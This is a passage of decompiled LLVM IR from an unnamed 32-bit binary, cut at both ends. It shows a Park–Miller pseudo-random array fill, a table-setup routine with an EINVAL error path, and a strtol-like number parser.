dec_label_pc_8050c8c:                             ; preds = %dec_label_pc_8050c79
  %v0_8050c8c = load i32, i32* @esi, align 4
  %v1_8050c8c = add i32 %v0_8050c8c, 16
  %v2_8050c8c = inttoptr i32 %v1_8050c8c to i32*
  %v3_8050c8c = load i32, i32* %v2_8050c8c, align 4
  store i32 %v3_8050c8c, i32* %eax.global-to-local, align 4
  %v0_8050c8f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050c8f, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8050c96 = sext i32 %v3_8050c8c to i64
  store i64 %v4_8050c96, i64* %stack_var_-40, align 8
  %v5_8050ccc21 = icmp sgt i32 %v3_8050c8c, 1
  br i1 %v5_8050ccc21, label %dec_label_pc_8050c9b, label %dec_label_pc_8050cce

dec_label_pc_8050c9b:                             ; preds = %dec_label_pc_8050c8c, %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge
  %v0_8050cc3 = phi i32 [ %v0_8050cc3.pre, %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge ], [ %v0_8050c8f, %dec_label_pc_8050c8c ]
  %v0_8050c9b = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ca2 = ashr i32 %v0_8050c9b, 31
  %v2_8050ca3 = zext i32 %v0_8050c9b to i64
  %v4_8050ca3 = zext i32 %v1_8050ca2 to i64
  %v5_8050ca3 = mul nuw i64 %v4_8050ca3, 4294967296
  %v6_8050ca3 = or i64 %v5_8050ca3, %v2_8050ca3
  %v8_8050ca3 = sdiv i64 %v6_8050ca3, 127773
  %v9_8050ca3 = trunc i64 %v8_8050ca3 to i32
  %v10_8050ca3 = srem i64 %v6_8050ca3, 127773
  %v3_8050ca9 = mul nsw i64 %v10_8050ca3, 16807
  %v4_8050ca9 = trunc i64 %v3_8050ca9 to i32
  %tmp43 = mul i32 %v9_8050ca3, -2836
  %v2_8050cb5 = add i32 %v4_8050ca9, %tmp43
  %v1_8050cb7 = add i32 %v2_8050cb5, 1
  %v6_8050cb7 = xor i32 %v2_8050cb5, -2147483648
  %v7_8050cb7 = xor i32 %v1_8050cb7, %v2_8050cb5
  %v8_8050cb7 = and i32 %v7_8050cb7, %v6_8050cb7
  %v9_8050cb7 = icmp slt i32 %v8_8050cb7, 0
  %v10_8050cb7 = icmp eq i32 %v1_8050cb7, 0
  %v11_8050cb7 = icmp slt i32 %v1_8050cb7, 0
  %v1_8050cba = add i32 %v2_8050cb5, 2147483647
  store i32 %v1_8050cba, i32* %eax.global-to-local, align 4
  %v3_8050cc0 = icmp ne i1 %v11_8050cb7, %v9_8050cb7
  %v4_8050cc0 = or i1 %v10_8050cb7, %v3_8050cc0
  %v7_8050cc0 = select i1 %v4_8050cc0, i32 %v1_8050cba, i32 %v2_8050cb5
  store i32 %v7_8050cc0, i32* %edx.global-to-local, align 4
  %v1_8050cc3 = add i32 %v0_8050cc3, 4
  store i32 %v1_8050cc3, i32* %ecx.global-to-local, align 4
  %v2_8050cc6 = inttoptr i32 %v1_8050cc3 to i32*
  store i32 %v7_8050cc0, i32* %v2_8050cc6, align 4
  %v0_8050cc8 = load i32, i32* @edi, align 4
  %v1_8050cc8 = add i32 %v0_8050cc8, 1
  store i32 %v1_8050cc8, i32* @edi, align 4
  %v3_8050cc9 = load i64, i64* %stack_var_-40, align 8
  %v4_8050cc9 = trunc i64 %v3_8050cc9 to i32
  %v5_8050ccc = icmp slt i32 %v1_8050cc8, %v4_8050cc9
  br i1 %v5_8050ccc, label %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge, label %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge

dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge: ; preds = %dec_label_pc_8050c9b
  %v0_8050cc3.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050c9b

dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge: ; preds = %dec_label_pc_8050c9b
  %v0_8050cce.pre = load i32, i32* @esi, align 4
  %v0_8050cd1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050cce

dec_label_pc_8050cce:                             ; preds = %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge, %dec_label_pc_8050c8c
  %v0_8050cd1 = phi i32 [ %v0_8050cd1.pre, %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge ], [ %v0_8050c8f, %dec_label_pc_8050c8c ]
  %v0_8050cce = phi i32 [ %v0_8050cce.pre, %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge ], [ %v0_8050c8c, %dec_label_pc_8050c8c ]
  %v1_8050cce = add i32 %v0_8050cce, 20
  %v2_8050cce = inttoptr i32 %v1_8050cce to i32*
  %v3_8050cce = load i32, i32* %v2_8050cce, align 4
  store i32 %v3_8050cce, i32* %eax.global-to-local, align 4
  %v2_8050cd1 = add i32 %v0_8050cce, 4
  %v3_8050cd1 = inttoptr i32 %v2_8050cd1 to i32*
  store i32 %v0_8050cd1, i32* %v3_8050cd1, align 4
  %v0_8050cd4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050cd4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cd4 = mul i32 %v1_8050cd4, 4
  %v3_8050cd4 = add i32 %v2_8050cd4, %v0_8050cd4
  store i32 %v3_8050cd4, i32* %eax.global-to-local, align 4
  %v1_8050cd7 = load i32, i32* @esi, align 4
  %v2_8050cd7 = inttoptr i32 %v1_8050cd7 to i32*
  store i32 %v3_8050cd4, i32* %v2_8050cd7, align 4
  %v3_8050cd9 = load i64, i64* %stack_var_-40, align 8
  %v6_8050cd9 = mul nsw i64 %v3_8050cd9, 10
  %v7_8050cd9 = trunc i64 %v6_8050cd9 to i32
  %v1_8050cec3 = add i32 %v7_8050cd9, -1
  %v9_8050cec8 = icmp slt i32 %v1_8050cec3, 0
  store i32 %v1_8050cec3, i32* @ebx, align 4
  %v1_8050ced9 = icmp eq i1 %v9_8050cec8, false
  br i1 %v1_8050ced9, label %dec_label_pc_8050cdf.lr.ph, label %dec_label_pc_8050cef

dec_label_pc_8050cdf.lr.ph:                       ; preds = %dec_label_pc_8050cce
  %v2_8050cdf = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8050cdf

dec_label_pc_8050cdf:                             ; preds = %dec_label_pc_8050cdf.lr.ph, %dec_label_pc_8050cdf
  store i32 %v2_8050cdf, i32* %eax.global-to-local, align 4
  %v0_8050ce4 = load i32, i32* @esi, align 4
  %v2_8050ce5 = inttoptr i32 %v0_8050ce4 to i32*
  %v3_8050ce5 = call i32 @function_8050c01(i32* %v2_8050ce5, i32 %v2_8050cdf)
  store i32 %v0_8050ce4, i32* %eax.global-to-local, align 4
  store i32 %v2_8050cdf, i32* %edx.global-to-local, align 4
  %v0_8050cec = load i32, i32* @ebx, align 4
  %v1_8050cec = add i32 %v0_8050cec, -1
  %v9_8050cec = icmp slt i32 %v1_8050cec, 0
  store i32 %v1_8050cec, i32* @ebx, align 4
  %v1_8050ced = icmp eq i1 %v9_8050cec, false
  br i1 %v1_8050ced, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cef

dec_label_pc_8050cef:                             ; preds = %dec_label_pc_8050cdf, %dec_label_pc_8050cce, %dec_label_pc_8050c79
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cf1

dec_label_pc_8050cf1:                             ; preds = %dec_label_pc_8050c5f, %dec_label_pc_8050cef
  %v0_8050cf8 = phi i32 [ -1, %dec_label_pc_8050c5f ], [ 0, %dec_label_pc_8050cef ]
  store i32 %v0_8050c65, i32* @ebx, align 4
  store i32 %v0_8050c64, i32* @esi, align 4
  store i32 %v0_8050c63, i32* @edi, align 4
  store i32 %v0_8050c5f, i32* @ebp, align 4
  ret i32 %v0_8050cf8

; uselistorder directives
  uselistorder i32 %v1_8050cec, { 1, 0 }
  uselistorder i32 %v0_8050cce, { 1, 0 }
  uselistorder i32 %v1_8050cb7, { 2, 1, 0 }
  uselistorder i32 %v2_8050cb5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8050c8f, { 1, 0, 2 }
  uselistorder i32 %v3_8050c71, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 1, 0 }
  uselistorder i32 %tmp33, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8050cf1, { 1, 0 }
  uselistorder label %dec_label_pc_8050cdf, { 1, 0 }
  uselistorder label %dec_label_pc_8050c9b, { 1, 0 }
}

define i32 @function_8050cf9(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050cf9:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050cfb = load i32, i32* @esi, align 4
  %v0_8050cfc = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050d1d, label %dec_label_pc_8050d11

dec_label_pc_8050d11:                             ; preds = %dec_label_pc_8050cf9
  %v2_8050d11 = icmp ult i32 %arg3, 256
  %v1_8050d18 = select i1 %v2_8050d11, i32 5, i32 4
  store i32 %v1_8050d18, i32* @ebx, align 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050d1d:                             ; preds = %dec_label_pc_8050cf9
  %v6_8050d20 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050d20, label %dec_label_pc_8050d2b, label %dec_label_pc_8050d22

dec_label_pc_8050d22:                             ; preds = %dec_label_pc_8050d1d
  store i32 0, i32* @ebx, align 4
  %v6_8050d27 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050d27, label %dec_label_pc_8050d33, label %dec_label_pc_8050d83

dec_label_pc_8050d2b:                             ; preds = %dec_label_pc_8050d1d
  %v2_8050d2b = icmp ult i32 %arg3, 64
  %v1_8050d30 = select i1 %v2_8050d2b, i32 3, i32 2
  store i32 %v1_8050d30, i32* @ebx, align 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050d33:                             ; preds = %dec_label_pc_8050d22, %dec_label_pc_8050d11, %dec_label_pc_8050d2b
  %v0_8050d3d = phi i32 [ 0, %dec_label_pc_8050d22 ], [ %v1_8050d18, %dec_label_pc_8050d11 ], [ %v1_8050d30, %dec_label_pc_8050d2b ]
  %v1_8050d33 = mul nuw nsw i32 %v0_8050d3d, 4
  %v2_8050d33 = add i32 %v1_8050d33, ptrtoint (i32* @global_var_8054294.83 to i32)
  %v3_8050d33 = inttoptr i32 %v2_8050d33 to i32*
  %v4_8050d33 = load i32, i32* %v3_8050d33, align 4
  store i32 %v4_8050d33, i32* %eax.global-to-local, align 4
  %v1_8050d3a = add i32 %tmp7, 4
  store i32 %v1_8050d3a, i32* @esi, align 4
  %v2_8050d3d = add i32 %v1_8050d33, ptrtoint (i32* @global_var_8054280.84 to i32)
  %v3_8050d3d = inttoptr i32 %v2_8050d3d to i32*
  %v4_8050d3d = load i32, i32* %v3_8050d3d, align 4
  store i32 %v4_8050d3d, i32* %edx.global-to-local, align 4
  %v2_8050d44 = add i32 %arg4, 12
  %v3_8050d44 = inttoptr i32 %v2_8050d44 to i32*
  store i32 %v0_8050d3d, i32* %v3_8050d44, align 4
  %v0_8050d47 = load i32, i32* @esi, align 4
  %v1_8050d47 = load i32, i32* @edi, align 4
  %v2_8050d47 = add i32 %v1_8050d47, 8
  %v3_8050d47 = inttoptr i32 %v2_8050d47 to i32*
  store i32 %v0_8050d47, i32* %v3_8050d47, align 4
  %v0_8050d4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d4a = load i32, i32* @edi, align 4
  %v2_8050d4a = add i32 %v1_8050d4a, 16
  %v3_8050d4a = inttoptr i32 %v2_8050d4a to i32*
  store i32 %v0_8050d4a, i32* %v3_8050d4a, align 4
  %v0_8050d4d = load i32, i32* @esi, align 4
  %v1_8050d4d = load i32, i32* %eax.global-to-local, align 4
  %v2_8050d4d = mul i32 %v1_8050d4d, 4
  %v3_8050d4d = add i32 %v2_8050d4d, %v0_8050d4d
  store i32 %v3_8050d4d, i32* %eax.global-to-local, align 4
  %v0_8050d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050d50 = load i32, i32* @edi, align 4
  %v2_8050d50 = add i32 %v1_8050d50, 20
  %v3_8050d50 = inttoptr i32 %v2_8050d50 to i32*
  store i32 %v0_8050d50, i32* %v3_8050d50, align 4
  %v0_8050d53 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d53 = load i32, i32* @edi, align 4
  %v2_8050d53 = add i32 %v1_8050d53, 24
  %v3_8050d53 = inttoptr i32 %v2_8050d53 to i32*
  store i32 %v0_8050d53, i32* %v3_8050d53, align 4
  %v0_8050d56 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050d5b = inttoptr i32 %v0_8050d56 to i32*
  %v3_8050d5b = call i32 @function_8050c5f(i32 %arg1, i32* %v2_8050d5b)
  %v0_8050d60 = load i32, i32* @ebp, align 4
  %v1_8050d60 = inttoptr i32 %v0_8050d60 to i32*
  store i32 0, i32* %v1_8050d60, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050d6b = load i32, i32* @ebx, align 4
  %v1_8050d6b = icmp eq i32 %v0_8050d6b, 0
  br i1 %v1_8050d6b, label %dec_label_pc_8050d9c, label %dec_label_pc_8050d6f

dec_label_pc_8050d6f:                             ; preds = %dec_label_pc_8050d33
  %v0_8050d6f = load i32, i32* @edi, align 4
  %v1_8050d6f = add i32 %v0_8050d6f, 4
  %v2_8050d6f = inttoptr i32 %v1_8050d6f to i32*
  %v3_8050d6f = load i32, i32* %v2_8050d6f, align 4
  %v1_8050d72 = load i32, i32* @esi, align 4
  %v2_8050d72 = sub i32 %v3_8050d6f, %v1_8050d72
  %v2_8050d74 = sdiv i32 %v2_8050d72, 4
  %v3_8050d77 = mul i32 %v2_8050d74, 5
  %v2_8050d7a = add i32 %v3_8050d77, %v0_8050d6b
  %v1_8050d7c = load i32, i32* @ebp, align 4
  %v2_8050d7c = inttoptr i32 %v1_8050d7c to i32*
  store i32 %v2_8050d7a, i32* %v2_8050d7c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d9c

dec_label_pc_8050d83:                             ; preds = %dec_label_pc_8050d22
  %v1_8050d83 = call i32 @function_804e694(i32 %v0_8050cfc)
  store i32 %v1_8050d83, i32* %eax.global-to-local, align 4
  %v1_8050d88 = inttoptr i32 %v1_8050d83 to i32*
  store i32 22, i32* %v1_8050d88, align 4
  %v0_8050d8e = load i32, i32* %stack_var_-36, align 4
  %v1_8050d8e = call i32 @function_804e694(i32 %v0_8050d8e)
  %v1_8050d93 = inttoptr i32 %v1_8050d8e to i32*
  store i32 22, i32* %v1_8050d93, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d9c

dec_label_pc_8050d9c:                             ; preds = %dec_label_pc_8050d33, %dec_label_pc_8050d6f, %dec_label_pc_8050d83
  %v0_8050da3 = phi i32 [ 0, %dec_label_pc_8050d33 ], [ 0, %dec_label_pc_8050d6f ], [ -1, %dec_label_pc_8050d83 ]
  store i32 %v0_8050cfb, i32* @esi, align 4
  ret i32 %v0_8050da3

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32*)* @function_8050c5f, { 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050d33, { 2, 0, 1 }
}

define i32 @function_8050da4(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050da4:
  %v3_8050daf = call i32 @function_8050db8(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8050daf
}

define i32 @function_8050db8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050db8:
  %v4_8050dc9 = inttoptr i32 %arg1 to i8*
  %v5_8050dc9 = call i32 @function_8050dd4(i8* %v4_8050dc9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8050dc9
}

define i32 @function_8050dd4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050dd4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %stack_var_-16 = alloca i32, align 4
  %v0_8050dd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050dd7, i32* %stack_var_-16, align 4
  %v4_8050ddb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050ddb, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8050de3 = load i32, i32* @global_var_8055684, align 4
  store i32 %v0_8050de3, i32* %edx.global-to-local, align 4
  store i32 %v4_8050ddb, i32* %ebx.global-to-local, align 4
  %v2_8050dee8 = load i8, i8* %arg1, align 1
  %v3_8050dee9 = sext i8 %v2_8050dee8 to i32
  store i32 %v3_8050dee9, i32* %eax.global-to-local, align 4
  %v2_8050df111 = mul nsw i32 %v3_8050dee9, 2
  %v3_8050df112 = add i32 %v2_8050df111, %v0_8050de3
  %v4_8050df113 = inttoptr i32 %v3_8050df112 to i8*
  %v5_8050df114 = load i8, i8* %v4_8050df113, align 1
  %v6_8050df115 = and i8 %v5_8050df114, 32
  %v7_8050df116 = icmp eq i8 %v6_8050df115, 0
  %v1_8050df517 = icmp eq i1 %v7_8050df116, false
  br i1 %v1_8050df517, label %dec_label_pc_8050ded, label %dec_label_pc_8050df7

dec_label_pc_8050ded:                             ; preds = %dec_label_pc_8050dd4, %dec_label_pc_8050ded
  %v0_8050ded = phi i32 [ %v1_8050ded, %dec_label_pc_8050ded ], [ %v4_8050ddb, %dec_label_pc_8050dd4 ]
  %v1_8050ded = add i32 %v0_8050ded, 1
  store i32 %v1_8050ded, i32* %ebx.global-to-local, align 4
  %v1_8050dee = inttoptr i32 %v1_8050ded to i8*
  %v2_8050dee = load i8, i8* %v1_8050dee, align 1
  %v3_8050dee = sext i8 %v2_8050dee to i32
  store i32 %v3_8050dee, i32* %eax.global-to-local, align 4
  %v2_8050df1 = mul nsw i32 %v3_8050dee, 2
  %v3_8050df1 = add i32 %v2_8050df1, %v0_8050de3
  %v4_8050df1 = inttoptr i32 %v3_8050df1 to i8*
  %v5_8050df1 = load i8, i8* %v4_8050df1, align 1
  %v6_8050df1 = and i8 %v5_8050df1, 32
  %v7_8050df1 = icmp eq i8 %v6_8050df1, 0
  %v1_8050df5 = icmp eq i1 %v7_8050df1, false
  br i1 %v1_8050df5, label %dec_label_pc_8050ded, label %dec_label_pc_8050df7

dec_label_pc_8050df7:                             ; preds = %dec_label_pc_8050ded, %dec_label_pc_8050dd4
  %v0_8050e12 = phi i32 [ %v4_8050ddb, %dec_label_pc_8050dd4 ], [ %v1_8050ded, %dec_label_pc_8050ded ]
  %v4_8050e29 = phi i32 [ %v3_8050dee9, %dec_label_pc_8050dd4 ], [ %v3_8050dee, %dec_label_pc_8050ded ]
  %v9_8050df7 = icmp eq i32 %v4_8050e29, 43
  br i1 %v9_8050df7, label %dec_label_pc_8050e12, label %dec_label_pc_8050dfc

dec_label_pc_8050dfc:                             ; preds = %dec_label_pc_8050df7
  %v9_8050dfc = icmp eq i32 %v4_8050e29, 45
  %v1_8050e04 = icmp eq i1 %v9_8050dfc, false
  br i1 %v1_8050e04, label %dec_label_pc_8050e13, label %dec_label_pc_8050e12

dec_label_pc_8050e12:                             ; preds = %dec_label_pc_8050df7, %dec_label_pc_8050dfc
  %storemerge5 = phi i8 [ 1, %dec_label_pc_8050dfc ], [ 0, %dec_label_pc_8050df7 ]
  %v1_8050e12 = add i32 %v0_8050e12, 1
  store i32 %v1_8050e12, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e13

dec_label_pc_8050e13:                             ; preds = %dec_label_pc_8050dfc, %dec_label_pc_8050e12
  %v0_8050e25 = phi i32 [ %v1_8050e12, %dec_label_pc_8050e12 ], [ %v0_8050e12, %dec_label_pc_8050dfc ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8050e12 ], [ 0, %dec_label_pc_8050dfc ]
  %v1_8050e13 = and i32 %arg3, -17
  %v2_8050e13 = icmp eq i32 %v1_8050e13, 0
  %v1_8050e1b = icmp eq i1 %v2_8050e13, false
  br i1 %v1_8050e1b, label %dec_label_pc_8050e41, label %dec_label_pc_8050e1d

dec_label_pc_8050e1d:                             ; preds = %dec_label_pc_8050e13
  %v1_8050e1d = add i32 %arg3, 10
  store i32 %v1_8050e1d, i32* %esi.global-to-local, align 4
  %v1_8050e20 = inttoptr i32 %v0_8050e25 to i8*
  %v2_8050e20 = load i8, i8* %v1_8050e20, align 1
  %v8_8050e20 = icmp eq i8 %v2_8050e20, 48
  %v1_8050e23 = icmp eq i1 %v8_8050e20, false
  br i1 %v1_8050e23, label %dec_label_pc_8050e36, label %dec_label_pc_8050e25

dec_label_pc_8050e25:                             ; preds = %dec_label_pc_8050e1d
  %v1_8050e25 = add i32 %v0_8050e25, 1
  store i32 %v1_8050e25, i32* %ebx.global-to-local, align 4
  %v1_8050e26 = add i32 %arg3, 8
  store i32 %v1_8050e26, i32* %esi.global-to-local, align 4
  %v1_8050e29 = inttoptr i32 %v1_8050e25 to i8*
  %v2_8050e29 = load i8, i8* %v1_8050e29, align 1
  %v2_8050e2d = or i8 %v2_8050e29, 32
  %v7_8050e2d = zext i8 %v2_8050e2d to i32
  %v9_8050e2d = and i32 %v4_8050e29, -256
  %v10_8050e2d = or i32 %v7_8050e2d, %v9_8050e2d
  store i32 %v10_8050e2d, i32* %eax.global-to-local, align 4
  %v10_8050e2f = icmp eq i8 %v2_8050e2d, 120
  %v1_8050e31 = icmp eq i1 %v10_8050e2f, false
  br i1 %v1_8050e31, label %dec_label_pc_8050e36, label %dec_label_pc_8050e33

dec_label_pc_8050e33:                             ; preds = %dec_label_pc_8050e25
  %v2_8050e33 = mul i32 %v1_8050e26, 2
  store i32 %v2_8050e33, i32* %esi.global-to-local, align 4
  %v1_8050e35 = add i32 %v0_8050e25, 2
  store i32 %v1_8050e35, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e36

dec_label_pc_8050e36:                             ; preds = %dec_label_pc_8050e25, %dec_label_pc_8050e1d, %dec_label_pc_8050e33
  %v0_8050e5e27 = phi i32 [ %v1_8050e25, %dec_label_pc_8050e25 ], [ %v0_8050e25, %dec_label_pc_8050e1d ], [ %v1_8050e35, %dec_label_pc_8050e33 ]
  %v0_8050eb836 = phi i32 [ %v1_8050e25, %dec_label_pc_8050e25 ], [ %v4_8050ddb, %dec_label_pc_8050e1d ], [ %v1_8050e25, %dec_label_pc_8050e33 ]
  %v3_8050e3e = phi i32 [ %v1_8050e26, %dec_label_pc_8050e25 ], [ %v1_8050e1d, %dec_label_pc_8050e1d ], [ %v2_8050e33, %dec_label_pc_8050e33 ]
  %v1_8050e36 = add i32 %v3_8050e3e, -17
  %v6_8050e36 = sub i32 16, %v3_8050e3e
  %v7_8050e36 = and i32 %v6_8050e36, %v3_8050e3e
  %v8_8050e36 = icmp slt i32 %v7_8050e36, 0
  %v10_8050e36 = icmp slt i32 %v1_8050e36, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8050e3e = icmp eq i1 %v10_8050e36, %v8_8050e36
  %v5_8050e3e = select i1 %v2_8050e3e, i32 16, i32 %v3_8050e3e
  store i32 %v5_8050e3e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e41

dec_label_pc_8050e41:                             ; preds = %dec_label_pc_8050e13, %dec_label_pc_8050e36
  %v0_8050eb837 = phi i32 [ %v4_8050ddb, %dec_label_pc_8050e13 ], [ %v0_8050eb836, %dec_label_pc_8050e36 ]
  %v0_8050e5e26 = phi i32 [ %v0_8050e25, %dec_label_pc_8050e13 ], [ %v0_8050e5e27, %dec_label_pc_8050e36 ]
  %v0_8050e50 = phi i32 [ %arg3, %dec_label_pc_8050e13 ], [ %v5_8050e3e, %dec_label_pc_8050e36 ]
  %v1_8050e41 = add i32 %v0_8050e50, -2
  store i32 %v1_8050e41, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8050e49 = icmp ugt i32 %v1_8050e41, 34
  br i1 %v6_8050e49, label %dec_label_pc_8050ead, label %dec_label_pc_8050e4b

dec_label_pc_8050e4b:                             ; preds = %dec_label_pc_8050e41
  %div = udiv i32 -1, %v0_8050e50
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp52 = urem i32 -1, %v0_8050e50
  %v1_8050e52 = trunc i32 %tmp52 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8050e8b = urem i32 %arg4, 256
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e5c:                             ; preds = %dec_label_pc_8050ea3, %dec_label_pc_8050e8b
  %v2_8050e60.pre = phi i32 [ %v0_8050ea6, %dec_label_pc_8050ea3 ], [ %v2_8050e60.pre.pre, %dec_label_pc_8050e8b ]
  %v4_8050e5e.pre = phi i32 [ %v1_8050e77, %dec_label_pc_8050ea3 ], [ %v4_8050e5e.pre.pre, %dec_label_pc_8050e8b ]
  %v0_8050e5c = phi i32 [ %v1_8050e7e, %dec_label_pc_8050ea3 ], [ %v0_8050e5c.pre, %dec_label_pc_8050e8b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8050ea3 ], [ %v6_8050e8f, %dec_label_pc_8050e8b ]
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e5e:                             ; preds = %dec_label_pc_8050e4b, %dec_label_pc_8050e5c
  %v0_8050eb835 = phi i32 [ %v0_8050eb837, %dec_label_pc_8050e4b ], [ %v0_8050e5c, %dec_label_pc_8050e5c ]
  %v0_8050e7e = phi i32 [ %v0_8050e5e26, %dec_label_pc_8050e4b ], [ %v0_8050e5c, %dec_label_pc_8050e5c ]
  %v2_8050e60 = phi i32 [ %v4_8050ddb, %dec_label_pc_8050e4b ], [ %v2_8050e60.pre, %dec_label_pc_8050e5c ]
  %v4_8050e5e = phi i32 [ %div, %dec_label_pc_8050e4b ], [ %v4_8050e5e.pre, %dec_label_pc_8050e5c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8050e4b ], [ %stack_var_-18.1, %dec_label_pc_8050e5c ]
  %v1_8050e5e = inttoptr i32 %v0_8050e7e to i8*
  %v2_8050e5e = load i8, i8* %v1_8050e5e, align 1
  %v3_8050e5e = zext i8 %v2_8050e5e to i32
  %v5_8050e5e = and i32 %v4_8050e5e, -256
  %v6_8050e5e = or i32 %v3_8050e5e, %v5_8050e5e
  store i32 %v6_8050e5e, i32* %eax.global-to-local, align 4
  %v2_8050e62 = add i8 %v2_8050e5e, -48
  %v12_8050e62 = zext i8 %v2_8050e62 to i32
  %v14_8050e62 = and i32 %v2_8050e60, -256
  %v15_8050e62 = or i32 %v12_8050e62, %v14_8050e62
  store i32 %v15_8050e62, i32* %ecx.global-to-local, align 4
  %tmp54 = icmp ult i8 %v2_8050e62, 10
  br i1 %tmp54, label %dec_label_pc_8050e77, label %dec_label_pc_8050e6a

dec_label_pc_8050e6a:                             ; preds = %dec_label_pc_8050e5e
  %v2_8050e6a = or i8 %v2_8050e5e, 32
  %v7_8050e6a = zext i8 %v2_8050e6a to i32
  %v10_8050e6a = or i32 %v7_8050e6a, %v5_8050e5e
  store i32 %v10_8050e6a, i32* %eax.global-to-local, align 4
  %v2_8050e6c = or i32 %v14_8050e62, 40
  store i32 %v2_8050e6c, i32* %ecx.global-to-local, align 4
  %tmp55 = icmp ult i8 %v2_8050e6a, 97
  br i1 %tmp55, label %dec_label_pc_8050e77, label %dec_label_pc_8050e72

dec_label_pc_8050e72:                             ; preds = %dec_label_pc_8050e6a
  %v2_8050e74 = add i8 %v2_8050e6a, -87
  %v15_8050e74 = zext i8 %v2_8050e74 to i32
  %v18_8050e74 = or i32 %v15_8050e74, %v14_8050e62
  store i32 %v18_8050e74, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050e77

dec_label_pc_8050e77:                             ; preds = %dec_label_pc_8050e6a, %dec_label_pc_8050e5e, %dec_label_pc_8050e72
  %v0_8050ea6 = phi i32 [ %v2_8050e6c, %dec_label_pc_8050e6a ], [ %v15_8050e62, %dec_label_pc_8050e5e ], [ %v18_8050e74, %dec_label_pc_8050e72 ]
  %v1_8050e77 = urem i32 %v0_8050ea6, 256
  store i32 %v1_8050e77, i32* %eax.global-to-local, align 4
  %v1_8050e7a = load i32, i32* %esi.global-to-local, align 4
  %v2_8050e7a = sub i32 %v1_8050e77, %v1_8050e7a
  %v10_8050e7a = and i32 %v2_8050e7a, %v1_8050e7a
  %v11_8050e7a = icmp slt i32 %v10_8050e7a, 0
  %v13_8050e7a = icmp slt i32 %v2_8050e7a, 0
